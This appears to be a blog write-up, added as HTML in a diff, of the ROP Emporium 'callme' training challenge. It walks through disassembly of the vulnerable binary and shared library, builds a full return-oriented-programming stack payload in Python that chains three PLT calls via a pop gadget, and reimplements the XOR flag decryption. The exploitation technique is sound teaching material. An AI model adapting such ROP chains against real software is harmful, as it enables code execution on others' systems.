@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>03_callme</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="03_callme" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="ROP Emporium callme" />
+<meta property="og:description" content="ROP Emporium callme" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-15T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"03_callme","dateModified":"2020-04-15T00:00:00+02:00","url":"/series/rop_emporium/ropemporium-callme/","datePublished":"2020-04-15T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/series/rop_emporium/ropemporium-callme/"},"author":{"@type":"Person","name":"silma"},"description":"ROP Emporium callme","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="rop-emporium-callme">ROP Emporium callme</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, gdb-gef, checksec
+<strong>Prerequistes:</strong> Stack frame
+<strong>Download solution:</strong> <a href="/assets/series/rop_emporium/main.py">main.py</a></p>
+
+<h2 id="overview">Overview</h2>
+
+<blockquote>
+  <p>“[…] You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag. […]”</p>
+</blockquote>
+
+<p>There it is, in this challenge we’ll have to build a chain that doesn’t provoke a segfault. The archive contains the following files:</p>
+<ul>
+  <li><strong>callme</strong>: Binary to exploit;</li>
+  <li><strong>libcallme.so</strong>: Shared library exporting the functions <em>callme_one()</em>, <em>callme_two()</em>, and <em>callme_tree()</em>;</li>
+  <li><strong>encrypted_flag.txt</strong>: The encypted flag (bummer!);</li>
+  <li><strong>key1.dat</strong>: Part n°1 of the decryption key;</li>
+  <li><strong>key2.dat</strong>: Part n°2 of the decryption key.</li>
+</ul>
+
+<h2 id="function-pwnme">Function <em>pwnme()</em>:</h2>
+
+<p>The function to pwn is similar to the previous challenges, the only difference is <em>_fgets()</em> accepts a longer input (256 bytes):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000401</span><span class="nf">A3C</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">stdin@@GLIBC_2_2_5</span> <span class="c1">; stream</span>
+<span class="err">0000000000401</span><span class="nf">A43</span>    <span class="nv">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">s</span><span class="p">]</span>
+<span class="err">0000000000401</span><span class="nf">A47</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">256</span>        <span class="c1">; n</span>
+<span class="err">0000000000401</span><span class="nf">A4C</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; s</span>
+<span class="err">0000000000401</span><span class="nf">A4F</span>    <span class="nv">call</span>    <span class="nv">_fgets</span>
+</code></pre></div></div>
+
+<h2 id="functions-_callme_one-_callme_two-and-_callme_three">Functions <em>_callme_one()</em>, <em>_callme_two()</em>, and <em>_callme_three()</em>:</h2>
+
+<p>These functions are exported by the dynamic library <em>libcallme.so</em>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf <span class="nt">--syms</span> libcallme.so | <span class="nb">grep </span>callme
+17: 00000000000009d4   214 FUNC    GLOBAL DEFAULT   12 callme_two
+21: 0000000000000aaa   246 FUNC    GLOBAL DEFAULT   12 callme_three
+22: 00000000000008f0   228 FUNC    GLOBAL DEFAULT   12 callme_one
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h3 id="function-_callme_one">Function <em>_callme_one()</em>:</h3>
+
+<p>It starts by checking the content of registers <em>edi</em>, <em>esi</em>, and <em>edx</em>:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">00000000000008</span><span class="nf">F8</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="p">],</span> <span class="nb">edi</span>
+<span class="err">00000000000008</span><span class="nf">FB</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg2</span><span class="p">],</span> <span class="nb">esi</span>
+<span class="err">00000000000008</span><span class="nf">FE</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg3</span><span class="p">],</span> <span class="nb">edx</span>
+<span class="err">0000000000000901</span>    <span class="nf">cmp</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="p">],</span> <span class="mi">1</span>
+<span class="err">0000000000000905</span>    <span class="nf">jnz</span>     <span class="nv">badboy</span>
+<span class="err">000000000000090</span><span class="nf">B</span>    <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg2</span><span class="p">],</span> <span class="mi">2</span>
+<span class="err">000000000000090</span><span class="nf">F</span>    <span class="nv">jnz</span>     <span class="nv">badboy</span>
+<span class="err">0000000000000915</span>    <span class="nf">cmp</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg3</span><span class="p">],</span> <span class="mi">3</span>
+<span class="err">0000000000000919</span>    <span class="nf">jnz</span>     <span class="nv">badboy</span>
+</code></pre></div></div>
+<p>Hence, it expects the follwing parameters when called:</p>
+<ul>
+  <li><em>edi</em> = 1</li>
+  <li><em>esi</em> = 2</li>
+  <li><em>edx</em> = 3</li>
+</ul>
+
+<p><a href=""></a>
+If inputs parameters are correct, the function opens the file <em>encrypted_flag.txt</em> and set its content into a global buffer:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000000927</span>    <span class="nf">lea</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nv">modes</span>      <span class="c1">; "r"</span>
+<span class="err">000000000000092</span><span class="nf">E</span>    <span class="nv">lea</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nv">filename</span>   <span class="c1">; "encrypted_flag.txt"</span>
+<span class="err">0000000000000935</span>    <span class="nf">call</span>    <span class="nv">_fopen</span>
+<span class="err">000000000000093</span><span class="nf">A</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">stream</span><span class="p">],</span> <span class="nb">rax</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">000000000000098</span><span class="nf">E</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">encrypted_flag</span>
+<span class="err">0000000000000995</span>    <span class="nf">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">stream</span><span class="p">]</span> <span class="c1">; stream</span>
+<span class="err">0000000000000999</span>    <span class="nf">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">21h</span>        <span class="c1">; n</span>
+<span class="err">000000000000099</span><span class="nf">E</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; s</span>
+<span class="err">00000000000009</span><span class="nf">A1</span>    <span class="nv">call</span>    <span class="nv">_fgets</span>
+<span class="err">00000000000009</span><span class="nf">A6</span>    <span class="nv">mov</span>     <span class="nb">cs</span><span class="p">:</span><span class="nv">encrypted_flag</span><span class="p">,</span> <span class="nb">rax</span>
+</code></pre></div></div>
+
+<h3 id="function-_callme_two">Function <em>_callme_two()</em>:</h3>
+
+<p>This function also checks that <em>edi</em>, <em>esi</em>, and <em>edx</em> are respectively set to <em>1</em>, <em>2</em>, and <em>3</em> (code not shown). If input parameters are correct, the function uses the content of the file <em>key1.dat</em> to decrypt the first 16 bytes of the flag:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000000</span><span class="nf">A4F</span> <span class="nv">decrypt_next</span><span class="p">:</span>
+<span class="err">0000000000000</span><span class="nf">A4F</span>    <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">stream</span><span class="p">]</span>
+<span class="err">0000000000000</span><span class="nf">A53</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; content of key1.dat</span>
+<span class="err">0000000000000</span><span class="nf">A56</span>    <span class="nv">call</span>    <span class="nv">_fgetc</span>          <span class="c1">; get next</span>
+<span class="err">0000000000000</span><span class="nf">A5B</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; key</span>
+<span class="err">0000000000000</span><span class="nf">A5D</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">encrypted_flag</span>
+<span class="err">0000000000000</span><span class="nf">A64</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0000000000000</span><span class="nf">A67</span>    <span class="nv">cdqe</span>                    <span class="c1">; dword to qword</span>
+<span class="err">0000000000000</span><span class="nf">A69</span>    <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; -&gt;encrypted[i]</span>
+<span class="err">0000000000000</span><span class="nf">A6C</span>    <span class="nv">mov</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">encrypted_flag</span>
+<span class="err">0000000000000</span><span class="nf">A73</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">]</span>
+<span class="err">0000000000000</span><span class="nf">A76</span>    <span class="nv">movsxd</span>  <span class="nb">rdx</span><span class="p">,</span> <span class="nb">edx</span>
+<span class="err">0000000000000</span><span class="nf">A79</span>    <span class="nv">add</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rcx</span>        <span class="c1">; -&gt;encrypted[i]</span>
+<span class="err">0000000000000</span><span class="nf">A7C</span>    <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span> <span class="c1">; encrypted char</span>
+<span class="err">0000000000000</span><span class="nf">A7F</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esi</span>        <span class="c1">; key</span>
+<span class="err">0000000000000</span><span class="nf">A81</span>    <span class="nv">xor</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; encrypted[i] xor key[i]</span>
+<span class="err">0000000000000</span><span class="nf">A83</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="nb">dl</span>       <span class="c1">; decrypted[i]</span>
+<span class="err">0000000000000</span><span class="nf">A85</span>    <span class="nv">add</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">],</span> <span class="mi">1</span>
+<span class="err">0000000000000</span><span class="nf">A89</span> <span class="nv">loc_A89</span><span class="p">:</span>
+<span class="err">0000000000000</span><span class="nf">A89</span>    <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">i</span><span class="p">],</span> <span class="mh">0Fh</span>
+<span class="err">0000000000000</span><span class="nf">A8D</span>    <span class="nv">jle</span>     <span class="nv">short</span> <span class="nv">decrypt_next</span>
+</code></pre></div></div>
+
+<h3 id="function-function-_callme_three">Function Function <em>_callme_three()</em>:</h3>
+
+<p>Again, <em>edi</em>, <em>esi</em>, and <em>edx</em> has to be set to <em>1</em>, <em>2</em>, and <em>3</em>, respectively (code not shown). Then, it uses the content of the file <em>key2.dat</em> to decrypt the next 16 bytes of the flag. The decryption follows the same algorithm as in previous section, so code is not shown. You can have a look an my <a href="#decryption">reimplementation in Python</a>.</p>
+
+<h2 id="function-usefulgadgets">Function <em>usefulGadgets()</em>:</h2>
+
+<p>Back to the main binary. Function <em>usefulGadgets()</em> is indeed really useful, because it pops everything we need from the stack to the registers we want:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000401</span><span class="nf">AB0</span> <span class="nv">usefulGadgets</span><span class="p">:</span>
+<span class="err">0000000000401</span><span class="nf">AB0</span>    <span class="nv">pop</span>     <span class="nb">rdi</span>
+<span class="err">0000000000401</span><span class="nf">AB1</span>    <span class="nv">pop</span>     <span class="nb">rsi</span>
+<span class="err">0000000000401</span><span class="nf">AB2</span>    <span class="nv">pop</span>     <span class="nb">rdx</span>
+<span class="err">0000000000401</span><span class="nf">AB3</span>    <span class="nv">retn</span>
+</code></pre></div></div>
+<p>So, if we were to call the function <em>usefulGadgets()</em> with the following stack frame, we could successfully call and execute the function <em>callme_one()</em>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000000001
+0x0000000000000002
+0x0000000000000003
+addr _callme\_one()_ 
+</code></pre></div></div>
+<p>Successfull calls to <em>callme_two()</em> and <em>callme_three()</em> would follow the same idea.</p>
+
+<h2 id="function-usefulfunction">Function <em>usefulFunction()</em>:</h2>
+
+<p>We’re still inside the main binary. We can’t directly call the function <em>usefulFunction()</em>, because (i) it doesn’t perform the calls to <em>_callme_xxx()</em> in the correct order, and (ii) it sets the wrong values into <em>edi</em>, <em>esi</em>, and <em>edx</em>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0000000000401</span><span class="nf">A57</span> <span class="nv">usefulFunction</span>  <span class="nv">proc</span> <span class="nv">near</span>
+<span class="err">0000000000401</span><span class="nf">A57</span>    <span class="nv">push</span>    <span class="nb">rbp</span>
+<span class="err">0000000000401</span><span class="nf">A58</span>    <span class="nv">mov</span>     <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rsp</span>
+<span class="err">0000000000401</span><span class="nf">A5B</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">6</span>
+<span class="err">0000000000401</span><span class="nf">A60</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">5</span>
+<span class="err">0000000000401</span><span class="nf">A65</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">4</span>
+<span class="err">0000000000401</span><span class="nf">A6A</span>    <span class="nv">call</span>    <span class="nv">_callme_three</span>
+<span class="err">0000000000401</span><span class="nf">A6F</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">6</span>
+<span class="err">0000000000401</span><span class="nf">A74</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">5</span>
+<span class="err">0000000000401</span><span class="nf">A79</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">4</span>
+<span class="err">0000000000401</span><span class="nf">A7E</span>    <span class="nv">call</span>    <span class="nv">_callme_two</span>
+<span class="err">0000000000401</span><span class="nf">A83</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mi">6</span>
+<span class="err">0000000000401</span><span class="nf">A88</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">5</span>
+<span class="err">0000000000401</span><span class="nf">A8D</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">4</span>
+<span class="err">0000000000401</span><span class="nf">A92</span>    <span class="nv">call</span>    <span class="nv">_callme_one</span>
+<span class="err">0000000000401</span><span class="nf">A97</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; status</span>
+<span class="err">0000000000401</span><span class="nf">A9C</span>    <span class="nv">call</span>    <span class="nv">_exit</span>
+<span class="err">0000000000401</span><span class="nf">A9C</span> <span class="nv">usefulFunction</span>  <span class="nv">endp</span>
+</code></pre></div></div>
+<p>It may be tempting to build an exploit executing code at addresses <em>0x0401A92</em>, <em>0x0401A7E</em>, and <em>0x0401A6A</em>. However, doing this will just make us loose the control we have over <em>rip</em>. Indeed, if the instruction at <em>0x0401A92</em> is executed, the return address <em>0x0401A97</em> will be set automatically on the stack. And game over for us. Instead, we will use the address of <em>_callme_xxx()</em> functions from the <em>procedure linkage table</em>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">.plt:</span><span class="err">0000000000401810</span> <span class="nf">_callme_three</span>   <span class="nv">proc</span> <span class="nv">near</span>
+<span class="nl">.plt:</span><span class="err">0000000000401810</span>    <span class="nf">jmp</span>     <span class="nb">cs</span><span class="p">:</span><span class="nv">off_602028</span> <span class="c1">; got.plt callme_three</span>
+<span class="nl">.plt:</span><span class="err">0000000000401810</span> <span class="nf">_callme_three</span>   <span class="nv">endp</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="nl">.plt:</span><span class="err">0000000000401850</span> <span class="nf">_callme_one</span>     <span class="nv">proc</span> <span class="nv">near</span>
+<span class="nl">.plt:</span><span class="err">0000000000401850</span>    <span class="nf">jmp</span>     <span class="nb">cs</span><span class="p">:</span><span class="nv">off_602048</span> <span class="c1">; got.plt callme_one</span>
+<span class="nl">.plt:</span><span class="err">0000000000401850</span> <span class="nf">_callme_one</span>     <span class="nv">endp</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="nl">.plt:</span><span class="err">0000000000401870</span> <span class="nf">_callme_two</span>     <span class="nv">proc</span> <span class="nv">near</span>
+<span class="nl">.plt:</span><span class="err">0000000000401870</span>    <span class="nf">jmp</span>     <span class="nb">cs</span><span class="p">:</span><span class="nv">off_602058</span> <span class="c1">; got.plt callme_two</span>
+<span class="nl">.plt:</span><span class="err">0000000000401870</span> <span class="nf">_callme_two</span>     <span class="nv">endp</span>
+</code></pre></div></div>
+<p>That will do the job.</p>
+
+<h2 id="chaining-things">Chaining things</h2>
+
+<p>Payload in Python:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x42\x42\x42\x42\x42\x42\x42\x42</span><span class="s">'</span>  <span class="c1"># RBP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xB0\x1A\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># addr "usefulGadgets()": pop edi, esi, edx, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param1 for callme_one()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x02\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param2 for callme_one()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x03\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param3 for callme_one()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x50\x18\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># plt proc callme_one()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xB0\x1A\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># addr "usefulGadgets()": pop edi, esi, edx, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param1 for callme_two()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x02\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param2 for callme_two()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x03\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param3 for callme_two()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x70\x18\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># plt proc callme_two()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xB0\x1A\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># addr "usefulGadgets()": pop edi, esi, edx, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param1 for callme_three()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x02\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param2 for callme_three()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x03\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># param3 for callme_three()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x10\x18\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># plt proc callme_three()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x97\x1A\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># proper exit
+</span></code></pre></div></div>
+
+<h2 id="decryption">Bonus: decryption</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># content of the file "encrypted_flag.txt"
+</span><span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x53\x4d\x53\x41\x7e\x67\x58\x78\x65\x6b\x68\x69\x65\x61\x63\x74</span><span class="s">'</span>
+<span class="n">encrypted_flag</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x74\x60\x4c\x27\x27\x74\x6e\x6c\x7c\x45\x7d\x70\x7c\x79\x3e\x5d</span><span class="s">'</span>
+<span class="n">encrypted_flag</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x21\x0a</span><span class="s">'</span>
+
+<span class="c1"># key1.dat and key2.dat contains 0x01 -&gt; 0x10 and 0x11 -&gt; 0x20, respectively. Thus:
+</span><span class="n">key</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">decrypted</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encrypted_flag</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">key</span> <span class="o">&lt;=</span> <span class="mh">0x1f</span><span class="p">:</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="o">^</span><span class="n">key</span><span class="p">)</span>
+        <span class="n">key</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+</code></pre></div></div>
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
